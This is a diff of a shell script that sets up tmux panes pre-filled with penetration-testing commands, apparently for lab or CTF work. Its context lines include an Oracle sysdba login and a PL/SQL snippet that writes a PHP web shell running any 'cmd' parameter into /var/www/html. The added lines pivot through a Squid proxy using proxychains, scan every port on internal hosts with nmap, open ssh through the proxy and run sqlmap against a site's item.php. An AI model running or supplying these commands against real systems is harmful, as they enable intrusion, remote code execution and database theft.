@@ -2621,8 +2621,25 @@ tmux send-keys -t PT:28.23 "printf \"\n# Oracle: Read / Write file - Read /etc/p
 tmux send-keys -t PT:28.23 "sqlplus USER/PASS@$ip:1521 as sysdba"
 tmux send-keys -t PT:28.24 "printf \"\n# Oracle: Read / Write file - Write /var/www/html/shell.php\n# DECLARE f UTL_FILE.FILE_TYPE; BEGIN f:=UTL_FILE.FOPEN('/var/www/html','shell.php','W'); UTL_FILE.PUT_LINE(f,'<?php'); UTL_FILE.PUT_LINE(f,'if(isset(\\\$_GET[\"cmd\"])){'); UTL_FILE.PUT_LINE(f,'\\\$output=shell_exec(\\\$_GET[\"cmd\"]);'); UTL_FILE.PUT_LINE(f,'echo\\\"<pre>\\\$output</pre>\\\";}?>'); UTL_FILE.FCLOSE(f); END; /\n\n\" " Enter
 tmux send-keys -t PT:28.24 "sqlplus USER/PASS@$ip:1521 as sysdba"
+cd $folderProject
 
-
+cd $folderProjectAuthN
+# SMB Credential Verification
+tmux new-window -t PT:29 -n '[3128] Squid (reverse proxy)'
+tmux split-window -v -t PT:29.0
+tmux split-window -v -t PT:29.1
+tmux select-pane -t "29.1"
+tmux split-window -h -t "29.1"
+tmux split-window -v -t PT:29.3
+# Esecuzione dei comandi nelle sottofinestre
+tmux send-keys -t PT:29.0 "# Squid: configure proxychains to Squid proxy" Enter
+tmux send-keys -t PT:29.0 "sudo sed -i '/127\.0\.0\.1/s/^/#/' /etc/proxychains4.conf && sudo grep -q "http $IP $PORTA $USER $PASS" /etc/proxychains4.conf || echo "http $IP $PORTA $USER $PASS" | sudo tee -a /etc/proxychains4.conf > /dev/null"
+tmux send-keys -t PT:29.1 "# Squid: nmap analysis via proxychains" Enter
+tmux send-keys -t PT:29.1 "proxychains nmap -sT -sV 127.0.0.1 -p- -Pn"
+tmux send-keys -t PT:29.2 "# Squid: ssh connection via proxychains" Enter
+tmux send-keys -t PT:29.2 "proxychains ssh USER@127.0.0.1"
+tmux send-keys -t PT:29.3 "# Squid: sqlmap configured with proxy but without proxychains" Enter
+tmux send-keys -t PT:29.3 "sudo sqlmap -u \"http://$site/item.php?size=1\" --current-db --proxy=\"http://$ip:3128\" --proxy-cred=\"USER:PASS\""
 cd $folderProject
 
 # Attivazione della modalità interattiva
